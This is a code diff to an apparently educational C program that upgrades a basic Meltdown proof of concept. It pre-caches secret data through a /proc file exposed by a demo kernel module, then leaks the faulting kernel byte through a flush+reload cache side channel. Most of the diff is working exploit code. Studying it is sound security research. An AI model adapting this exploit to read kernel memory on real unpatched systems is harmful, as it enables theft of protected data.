@@ -1,8 +1,13 @@
 /*
- * ooe.c 
- * Exploit out of order execution to determine if we might be 
- * able to continue execution past an instruction that triggers 
- * an execption (say, for instance, reading kernel memory...)
+ * improved.c 
+ * Slightly improved version of the basic meltdown attack. 
+ * Now, we utilize the kernel module to ensure that the secret data 
+ * to which we desire access is cached before attempting to access it. 
+ * This improves the chances that we will 'win' the data race that 
+ * allows us to access this restricted memory. 
+ *
+ * NOTE:
+ * Probability of attack success with this variant remains low. 
  *
  * Kyle Dotterrer
  * December, 2018 
@@ -60,6 +65,22 @@ int main(void) {
 	// setup signal handler for memory violation 
 	signal(SIGSEGV, catch_segv);
 
+	// open the /proc/secret_data virtual file 
+	// in our kernel module implementation, we allow a user-level process to invoke a function inside of the module
+	// in this case, the function reads the secret data WITHOUT actually leaking it to the user process
+	int fd = open("/proc/secret_data", O_RDONLY);
+	if (fd < 0) {
+		perror("open");
+		exit(1); 
+	}
+
+	// however, what it does do it allow us to ensure that the data is cached...
+	int ret = pread(fd, NULL, 0, 0); 
+	if (ret < 0) {
+		perror("pread");
+		exit(1); 
+	}
+
 	// flush the probe array
 	flush_side_channel();
 
@@ -108,7 +129,7 @@ void reload_side_channel(void) {
 		// what the secret value used to access the array was 
 		if (time2 <= CACHE_HIT_THRESHOLD) {
 			printf("array[%d*4096 + %d] is in cache\n", i, DELTA);
-			printf("the secret = %d\n", i);
+			printf("the secret = %c\n", (char) i);
 		}
 	}
 }
@@ -119,11 +140,9 @@ void meltdown(unsigned long kernel_data_addr) {
 	// operation will cause memory violation
 	kernel_data = *(char *) kernel_data_addr;
 
-	// but will this still execute? 
-	array[7*4096 + DELTA] += 1;
-
-	// have to use the variable so -Wall doesnt complain 
-	printf("got kernel data: %c\n", kernel_data); 
+	// altered from previous example
+	// now we use the kernel data to access the probe array 
+	array[kernel_data*4096 + DELTA] += 1;
 }
 
 static void catch_segv() {
